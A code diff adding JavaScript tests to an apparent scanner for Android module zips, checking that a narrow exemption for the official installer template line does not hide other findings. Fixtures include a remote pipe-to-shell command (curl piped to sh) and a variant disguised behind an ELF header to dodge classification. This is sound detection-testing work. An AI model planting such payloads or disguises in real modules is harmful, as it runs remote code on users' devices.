@@ -5440,3 +5440,237 @@ test('P10-C3 整包（工单 §2 硬约束 1）：降的是 severity，不是删
   const keys = r.findings.map((f) => `${f.ruleId}@${f.file}:${f.line}`);
   assert.equal(new Set(keys).size, keys.length, 'counts 去重键口径不变');
 });
+
+// ===========================================================================
+// A1 —— 自带官方 `update-binary` 的模块：标准安装器那一行按「限定路径 + 逐字相符」降级为 info
+// ===========================================================================
+// 工单 briefs/task-a1.md。这条**是用户拍的**（计划 §2.6 第三批，2026-10-14），主控当时推荐的是
+// 不豁免，并且一度把这条记反成「不豁免」，2026-10-15 对着会话原文核对后订正 —— 所以这一格是
+// 实现活，不是文档活。两侧夹具都要写：正面钉「豁免真的生效」，反面钉「豁免窄到什么程度」。
+//
+// 主控派活前量好的两条边界（本段各自复现一次，不复现就不算数）：
+//   * 逐字模板行落在条目 `META-INF/com/google/android/update-binary` 上**只**触发 EXEC_BUNDLED_FILE/high；
+//   * 同一行把 `$MODPATH` 换成 `$MD` 触发的是 **EXEC_INDIRECT/high** —— 另一条规则，本轮一个字没碰。
+// ⇒ 豁免面天然只有这一条规则、这一个路径、这一行逐字形状：「换个写法就照报」不是额外要求，
+//   是这两条规则本来就不重叠（A1-N5 把这条钉成夹具）。
+//
+// 语义两条，各管各的，一条都不许顺手并掉（工单 §2）：
+//   降级：finding 仍在 report.findings，severity 降到 info，advice 说清为什么（不许 null 删证据、
+//         不许 low —— low 参与定级，info 不参与，A1-C1 钉这两者不等价）；
+//   记账：被这一行 source 的 `customize.sh` **照样进扫描面**。引用解析跑的是原始 pattern，
+//         不看这条豁免 —— A1-N6 用两发整包用例把它钉成可证伪的断言，变异 M5 必须红在那里。
+
+const A1_UB = 'META-INF/com/google/android/update-binary';
+const A1_TPL = '[ -f $MODPATH/customize.sh ] && . $MODPATH/customize.sh';
+
+test('A1-01 正面：模板逐字行 @ 官方 update-binary 条目 ⇒ 1 条 finding、severity info、advice 写明逐字相符', () => {
+  const h = hits('EXEC_BUNDLED_FILE', A1_TPL, A1_UB);
+  assert.equal(h.length, 1, `降级不删证据：命中必须还在报告面上，且一行只有一条：${JSON.stringify(h)}`);
+  assert.equal(h[0].ruleId, 'EXEC_BUNDLED_FILE');
+  assert.equal(h[0].severity, 'info', `限定路径 + 整行逐字 ⇒ 降severity：${JSON.stringify(h[0])}`);
+  assert.equal(countsTowardRisk(h[0]), false, 'info 不参与定级（这是这条豁免唯一的代价来源）');
+  assert.match(h[0].advice, /逐字相符/, '理由要写在报告面上，不许由「没命中」反推');
+  // 证据本体一个字不许改：snippet 还是那个匹配，file/line 还是那一行
+  assert.equal(h[0].snippet, '. $MODPATH/customize.sh', JSON.stringify(h[0]));
+  assert.equal(h[0].file, A1_UB);
+  assert.equal(h[0].line, 1);
+  // 规则自己的默认档不许被这条豁免带走（撤销、引用解析、脱敏都还按 high 那条规则说话）
+  assert.equal(EXEC_BUNDLED_FILE.severity, 'high', '规则声明的默认 severity 仍是 high：降的是这一条 finding');
+});
+
+test('A1-02 正面：同一行的 CRLF / 尾随空白版本 ⇒ 仍 info（行尾差异不是形状差异，不为此交人工税）', () => {
+  // 真包里的 update-binary 常常整篇 CRLF（Windows 上编辑过的模板）。
+  // 比对前只许做两件事：行尾 `\r` 归一 + 整行 trim —— 这两格就是那两件事的边界。
+  const crlfFile = '#!/system/bin/sh\r\n' + A1_TPL + '\r\n';
+  const h1 = hits('EXEC_BUNDLED_FILE', crlfFile, A1_UB);
+  assert.deepEqual(h1.map((f) => `${f.line}/${f.severity}`), ['2/info'], JSON.stringify(h1));
+  // 单独的 `\r`（老 Mac 行尾 / 半截 CRLF）：split(/\r?\n/) 会把 \r 留在行里，归一必须自己吃掉它
+  const loneCr = hits('EXEC_BUNDLED_FILE', A1_TPL + '\r', A1_UB);
+  assert.equal(loneCr.length, 1, JSON.stringify(loneCr));
+  assert.equal(loneCr[0].severity, 'info', '行尾 \\r 归一之后它就是那一行模板：' + JSON.stringify(loneCr[0]));
+  // 整行 trim 允许：首尾空白不算形状差异
+  for (const text of [A1_TPL + '   ', '   ' + A1_TPL, A1_TPL + '\t']) {
+    const h = hits('EXEC_BUNDLED_FILE', text, A1_UB);
+    assert.equal(h.length, 1, JSON.stringify(h));
+    assert.equal(h[0].severity, 'info', `trim 之后逐字相等：${JSON.stringify(text)}`);
+  }
+});
+
+test('A1-N1 反面：同一条模板行落在别的条目上 ⇒ 照报 high（判据①：路径限定，缺一即报）', () => {
+  for (const file of ['customize.sh', 'service.sh', 'post-fs-data.sh', 'webroot/install.sh',
+    'META-INF/com/google/android/updater-script']) {
+    const h = hits('EXEC_BUNDLED_FILE', A1_TPL, file);
+    assert.equal(h.length, 1, `${file}: ${JSON.stringify(h)}`);
+    assert.equal(h[0].severity, 'high', `条目路径不是那个逐字路径就不许降：${file}`);
+  }
+});
+
+test('A1-N2 反面：路径的六种近似写法 ⇒ 全部 high（不许 endsWith、不许忽略大小写、不许归一斜杠）', () => {
+  const LOOKALIKES = [
+    'META-INF/com/google/android/update-binary.sh',   // 尾巴多个后缀
+    'META-INF/com/google/android/Update-Binary',      // 大小写变体
+    'META-INF/com/google/android//update-binary',     // 双斜杠
+    'META-INF/COM/GOOGLE/ANDROID/update-binary',      // 整段大写
+    './META-INF/com/google/android/update-binary',    // 带 ./ 前缀
+    'META-INF/com/google/android/update-binary ',     // 条目名尾随空格
+  ];
+  for (const file of LOOKALIKES) {
+    const h = hits('EXEC_BUNDLED_FILE', A1_TPL, file);
+    assert.equal(h.length, 1, `${file}: ${JSON.stringify(h)}`);
+    assert.equal(h[0].severity, 'high', `宽松匹配就是投稿者可造的豁免面：${JSON.stringify(file)}`);
+  }
+});
+
+test('A1-N3 反面：同行还有别的命令 ⇒ high（判据③钉在整行，不是钉在匹配上）+ 锚点闭包表不变量未被动过', () => {
+  const DECOYS = [
+    'x=1; ' + A1_TPL,                       // 工单点名的那一发（也是闭包表的 ANCHOR_PREFIX）
+    A1_TPL + '; ui_print "- done"',         // 后面接活
+    'ui_print "- start"; ' + A1_TPL,        // 前面有活
+    'if [ -f $MODPATH/customize.sh ]; then . $MODPATH/customize.sh; fi', // 折成一行的 if
+    A1_TPL + ' \\',                         // 借续行反斜杠变形
+  ];
+  for (const text of DECOYS) {
+    const h = hits('EXEC_BUNDLED_FILE', text, A1_UB);
+    assert.equal(h.length, 1, `${JSON.stringify(text)}: ${JSON.stringify(h)}`);
+    assert.equal(h[0].severity, 'high', `同行有别的命令就不是那「一整行」模板：${JSON.stringify(text)}`);
+  }
+  // 闭包表（fix4-P14）的 witness 载荷本来就不是这个形状，所以它那条「恰好 1 条命中」的不变量
+  // 在这条豁免前后一字不动 —— 也就是说：**这张表对本轮不敏感，它不是这一格的证据**。
+  // 真正拦住「豁免落在匹配上」的是上面那发 `x=1; ` 前缀（工单 §2.3 要的就是这个结论）。
+  for (const text of ['sh $MODDIR/payload.bin', 'x=1; sh $MODDIR/payload.bin']) {
+    for (const file of ['customize.sh', A1_UB]) {
+      const h = hits('EXEC_BUNDLED_FILE', text, file);
+      assert.equal(h.length, 1, `${file} / ${JSON.stringify(text)}: ${JSON.stringify(h)}`);
+      assert.equal(h[0].severity, 'high', `witness 载荷与豁免形状无关，不许被顺手降档：${text}`);
+    }
+  }
+});
+
+test('A1-N4 反面：照抄模板再多加一行 ⇒ 第一行 info、第二行照报 high（逐行判，不整文件判）', () => {
+  const text = '#!/system/bin/sh\n' + A1_TPL + '\n. $MODPATH/payload.sh\n';
+  const h = hits('EXEC_BUNDLED_FILE', text, A1_UB);
+  assert.deepEqual(h.map((f) => f.line), [2, 3], '两行各一条，一条都不许多/少：' + JSON.stringify(h));
+  assert.deepEqual(h.map((f) => `${f.line}/${f.severity}`), ['2/info', '3/high'],
+    '模板那行降档，第二行（真载荷）必须还是 high：' + JSON.stringify(h));
+  assert.equal(h[1].ruleId, 'EXEC_BUNDLED_FILE', '实测：dot-source + 字面 $MODPATH 落在 EXEC_BUNDLED_FILE 自己身上');
+  assert.equal(h[1].snippet, '. $MODPATH/payload.sh', JSON.stringify(h[1]));
+});
+
+test('A1-N5 反面：变量名与写法变体 ⇒ 逐条 high（本轮收窄可伪造性的主证据）', () => {
+  const VARIANTS = [
+    ['换模块变量 $MODDIR', '[ -f $MODDIR/customize.sh ] && . $MODDIR/customize.sh'],
+    ['test -f 代替 [ ]', 'test -f $MODPATH/customize.sh && . $MODPATH/customize.sh'],
+    ['${MODPATH} 花括号', '[ -f ${MODPATH}/customize.sh ] && . ${MODPATH}/customize.sh'],
+    ['带引号', '[ -f "$MODPATH/customize.sh" ] && . "$MODPATH/customize.sh"'],
+    ['&& 前后不带空格', '[ -f $MODPATH/customize.sh ]&&. $MODPATH/customize.sh'],
+    ['路径里插 ./', '[ -f $MODPATH/./customize.sh ] && . $MODPATH/./customize.sh'],
+    ['词间用制表符', '[ -f\t$MODPATH/customize.sh ] && . $MODPATH/customize.sh'],
+    ['if … then … fi 拆行', 'if [ -f $MODPATH/customize.sh ]; then\n  . $MODPATH/customize.sh\nfi\n'],
+    ['多一个空格', '[ -f  $MODPATH/customize.sh ] && . $MODPATH/customize.sh'],
+  ];
+  for (const [name, text] of VARIANTS) {
+    const h = hits('EXEC_BUNDLED_FILE', text, A1_UB);
+    assert.equal(h.length, 1, `${name}: ${JSON.stringify(h)}`);
+    assert.equal(h[0].severity, 'high', `${name} —— 不折叠空白、不规范化变量名、不脱外层判断：${JSON.stringify(text)}`);
+  }
+  // 换变量名那一格走的是**另一条规则**（主控 §0 量的第二格）：EXEC_BUNDLED_FILE 0 命中，
+  // EXEC_INDIRECT high —— 本轮没碰 EXEC_INDIRECT 的任何判据，这一格就是那条边界的收据。
+  const MD = '[ -f $MD/customize.sh ] && . $MD/customize.sh';
+  assert.equal(hits('EXEC_BUNDLED_FILE', MD, A1_UB).length, 0, '这条形状不归 EXEC_BUNDLED_FILE');
+  const ind = hits('EXEC_INDIRECT', MD, A1_UB);
+  assert.equal(ind.length, 1, JSON.stringify(ind));
+  assert.equal(ind[0].severity, 'high', '换变量名的写法照报，而且报在另一条规则上：' + JSON.stringify(ind[0]));
+});
+
+test('A1-N6 记账（本轮的存在理由）：豁免只改呈现 —— 模板行引用的 customize.sh 照样进扫描面并被逐行读', async () => {
+  // (a) 常规形状：customize.sh 是可读文本、本来就在可撤销面上。
+  //     「引用解析不看豁免」在这里的收据是那一笔撤销证人 —— 它由**模板行**产生：
+  //     把 exclude 套进 resolveBundledRefs（变异 M5）就没有这笔账，且那条 EXEC 命中会留在报告里。
+  const plain = makeModuleZip({ id: 'eval.a1n6a', files: [
+    ['module.prop', moduleProp('eval.a1n6a')],
+    [A1_UB, '#!/system/bin/sh\n' + A1_TPL + '\n'],
+    ['customize.sh', '#!/system/bin/sh\ncurl -s https://abc.cc/x.sh | sh\n'],
+  ]});
+  const ra = await scanToReport(plain, { changeType: 'first' });
+  const pipeA = ra.findings.filter((f) => f.ruleId === 'PIPE_TO_SHELL');
+  assert.equal(pipeA.length, 1, JSON.stringify(pipeA.map((f) => `${f.file}:${f.line}/${f.severity}`)));
+  assert.equal(pipeA[0].file, 'customize.sh', '载荷必须由**它自己那一行**说话，指鹿为马的证据比没有证据更糟');
+  assert.equal(pipeA[0].line, 2, JSON.stringify(pipeA[0]));
+  assert.equal(pipeA[0].severity, 'high');
+  assert.deepEqual(ra.revokedBundledRefs.map((v) => `${v.ruleId}@${v.file}:${v.line}->${v.resolvedEntry}`),
+    [`EXEC_BUNDLED_FILE@${A1_UB}:2->customize.sh`],
+    '模板行仍然产生引用证人 —— 豁免没有把引用解析一起关掉：' + JSON.stringify(ra.revokedBundledRefs));
+  assert.ok(ra.scripts.some((s) => s.name === 'customize.sh'),
+    `扫描面不许因为这条豁免而缩小：${JSON.stringify(ra.scripts.map((s) => s.name))}`);
+  assert.equal(ra.riskLevel, 'high', '整包 high：呈现降级不缩小扫描面');
+  assert.equal(ra.decision.action, 'block');
+
+  // (b) 升级通道那一格：载荷伪装成 customize.sh（ELF magic + NUL 填充）⇒ classify 把它落 binaries，
+  //     它不在那五个桶里、也过不了 Task 4 的可打印比例，**唯一**进扫描面的路就是模板行那条引用。
+  //     这一发才是「豁免顺手把扫描面也关掉」的直接死因：变异 M5 红在 escalated / PIPE_TO_SHELL 这两格。
+  const disguised = Buffer.concat([
+    Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00]),
+    Buffer.alloc(400, 0),
+    Buffer.from('#!/system/bin/sh\ncurl -s https://abc.cc/x.sh | sh\n', 'utf8'),
+  ]);
+  assert.equal(sharedT4.printableRatio(disguised) < sharedT4.POLYGLOT_MIN_PRINTABLE, true,
+    `夹具前提：Task 4 的 polyglot 通道不许接住它（比例 ${sharedT4.printableRatio(disguised).toFixed(4)} / 阈值 0.85）`);
+  const zipB = makeModuleZip({ id: 'eval.a1n6b', files: [
+    ['module.prop', moduleProp('eval.a1n6b')],
+    [A1_UB, '#!/system/bin/sh\n' + A1_TPL + '\n'],
+    ['customize.sh', disguised],
+  ]});
+  const cls = classify(readZip(zipB).files);
+  assert.deepEqual(cls.canonical.map((f) => f.name), [], '夹具前提：它没进 canonical（可撤销面）');
+  assert.deepEqual(cls.binaries.map((f) => f.name), ['customize.sh'],
+    '夹具前提：伪装成 customize.sh 的载荷落 binaries ⇒ 只能靠引用升级进面');
+  const rb = await scanToReport(zipB, { changeType: 'first' });
+  assert.deepEqual(rb.escalated, [{ fromFile: A1_UB, fromLine: 2, ref: '. $MODPATH/customize.sh', resolvedEntry: 'customize.sh' }],
+    `模板行必须照样把被引用的条目拉进扫描面：${JSON.stringify(rb.escalated)}`);
+  assert.ok(rb.scripts.some((s) => s.name === 'customize.sh'),
+    `被豁免那一行引用的条目必须在扫描面上：${JSON.stringify(rb.scripts.map((s) => s.name))}`);
+  const pipeB = rb.findings.filter((f) => f.ruleId === 'PIPE_TO_SHELL');
+  assert.equal(pipeB.length, 1, JSON.stringify(pipeB.map((f) => `${f.file}:${f.line}/${f.severity}`)));
+  assert.equal(pipeB[0].file, 'customize.sh');
+  assert.equal(pipeB[0].severity, 'high', '载荷内容被逐行读到了 —— 豁免没有让它变成没读过');
+  assert.equal(rb.riskLevel, 'high');
+  assert.equal(rb.decision.action, 'block');
+});
+
+test('A1-C1 不变量：info 与 low 不等价、豁免只有一处实现点、且不住在 scan.mjs 里', () => {
+  // 工单 §2：不许写成 null（删证据），也不许写成 low —— 这两档在定级口径上不是一回事。
+  assert.equal(countsTowardRisk({ severity: 'info' }), false);
+  assert.equal(countsTowardRisk({ severity: 'low' }), true);
+  assert.equal(SEVERITY_ORDER.low > SEVERITY_ORDER.info, true, 'low 排在 info 之上，才会出现「记成 low 就抬等级」');
+  assert.equal(scoreRisk([{ severity: 'info' }]).counts, { high: 0, medium: 0, low: 0, info: 1 },
+    '一条 info 不参与定级：等级仍是 low 且 counts.low = 0');
+  assert.equal(scoreRisk([{ severity: 'low' }]).counts.low, 1, '同一条写成 low 就进 counts.low');
+
+  // 判据的三个字面量必须是**具名单一常量**，别处不许抄第二份（HARDCODED_IP / P10 那条老规矩）
+  assert.equal(sharedT4.OFFICIAL_UPDATER_BINARY_ENTRY, A1_UB);
+  assert.equal(sharedT4.OFFICIAL_INSTALLER_TEMPLATE_LINE, A1_TPL);
+  assert.equal(typeof sharedT4.isOfficialInstallerShape, 'function', '判据要拿得出来，只许有一份');
+  assert.equal(sharedT4.isOfficialInstallerShape(A1_UB, A1_TPL), true);
+  assert.equal(sharedT4.isOfficialInstallerShape(A1_UB.toLowerCase(), A1_TPL), false, '大小写不许被吃掉');
+  assert.equal(sharedT4.isOfficialInstallerShape(A1_UB, 'x=1; ' + A1_TPL), false, '整行比对，不是子串比对');
+  const ebRules = CONTENT_RULES.filter((r) => /^EXEC_BUNDLED_FILE/.test(r.id));
+  assert.equal(ebRules.length, 1, `EXEC_BUNDLED_FILE 族只许一条规则：${ebRules.map((r) => r.id).join(',')}`);
+  assert.equal(CONTENT_RULES.includes(EXEC_BUNDLED_FILE), true, '进规则表的必须就是导出那一个对象');
+  assert.equal(RULES_BY_ID.EXEC_BUNDLED_FILE, EXEC_BUNDLED_FILE);
+  // scan.mjs 不许替这条规则做 severity 后处理（P10-C2 同一条规矩）：判据住在规则层
+  const scanSrc = readFileSync(new URL('./scan.mjs', import.meta.url), 'utf8');
+  assert.equal(/OFFICIAL_INSTALLER|OFFICIAL_UPDATER|isOfficialInstallerShape/.test(scanSrc), false,
+    'scan.mjs 里不许出现这条豁免的实现或第二份判据');
+  // 引用解析这条链一个字没改：豁免之后的模板行照样产出引用记录（A1-N6 的机器面）
+  const refs = resolveBundledRefs([{ name: A1_UB, content: A1_TPL + '\n' }],
+    [{ name: A1_UB }, { name: 'customize.sh' }], 'eval.a1n6a', {});
+  assert.equal(refs.length, 1, JSON.stringify(refs));
+  assert.equal(refs[0].ruleId, 'EXEC_BUNDLED_FILE');
+  assert.equal(refs[0].resolved, true, JSON.stringify(refs[0]));
+  // scan.mjs 的 verdict 层不许把降下来的 info 抬回 high，也不许因为它是 info 就删掉它
+  const kept = scanT4.applyBundledRefVerdicts(
+    [{ ruleId: 'EXEC_BUNDLED_FILE', category: 'execution', severity: 'info',
+      file: A1_UB, line: 1, snippet: '. $MODPATH/customize.sh', message: 't', advice: 'a' }], [], null, []);
+  assert.equal(kept.length, 1, JSON.stringify(kept));
+  assert.equal(kept[0].severity, 'info', 'verdict 层只改 snippet/advice，不动等级：' + JSON.stringify(kept[0]));
+});
